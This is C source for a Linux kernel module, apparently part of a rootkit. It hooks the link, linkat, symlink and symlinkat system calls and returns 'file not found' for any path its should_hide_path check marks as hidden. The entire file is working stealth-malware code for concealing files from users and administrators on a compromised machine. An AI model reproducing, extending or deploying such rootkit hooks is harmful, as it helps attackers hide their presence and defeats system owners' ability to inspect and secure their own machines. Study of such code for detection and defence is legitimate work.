#include "../inc/hooks.h"
#include "../inc/util.h"

#include <linux/module.h>
#include <linux/namei.h>
#include <linux/path.h>

void *_link      = NULL;
void *_linkat    = NULL;
void *_symlink   = NULL;
void *_symlinkat = NULL;

asmlinkage int64_t h_link(const struct pt_regs *r) {
  const char __user *old = (void *)r->di;
  struct path        old_path;
  int64_t            ret = 0;

  hfind(_link, "__x64_sys_link");

  if (user_path_at(AT_FDCWD, old, LOOKUP_FOLLOW, &old_path) != 0)
    goto end;

  if (should_hide_path(&old_path))
    ret = -ENOENT;

end:
  if (ret == 0)
    hsyscall(_link);

  return ret;
}

asmlinkage int64_t h_linkat(const struct pt_regs *r) {
  const char __user *old     = (void *)r->si;
  int32_t            old_dfd = r->di;
  struct path        old_path;
  int64_t            ret = 0;

  hfind(_linkat, "__x64_sys_linkat");

  if (user_path_at(old_dfd, old, LOOKUP_FOLLOW, &old_path) != 0)
    goto end;

  if (should_hide_path(&old_path))
    ret = -ENOENT;

end:
  if (ret == 0)
    hsyscall(_linkat);

  return ret;
}

asmlinkage int64_t h_symlink(const struct pt_regs *r) {
  const char __user *old = (void *)r->di;
  struct path        old_path;
  int64_t            ret = 0;

  hfind(_symlink, "__x64_sys_symlink");

  if (user_path_at(AT_FDCWD, old, LOOKUP_FOLLOW, &old_path) != 0)
    goto end;

  if (should_hide_path(&old_path))
    ret = -ENOENT;

end:
  if (ret == 0)
    hsyscall(_symlink);

  return ret;
}

asmlinkage int64_t h_symlinkat(const struct pt_regs *r) {
  const char __user *old = (void *)r->di;
  struct path        old_path;
  int64_t            ret = 0;

  hfind(_symlinkat, "__x64_sys_symlinkat");

  if (user_path_at(AT_FDCWD, old, LOOKUP_FOLLOW, &old_path) != 0)
    goto end;

  if (should_hide_path(&old_path))
    ret = -ENOENT;

end:
  if (ret == 0)
    hsyscall(_symlinkat);

  return ret;
}
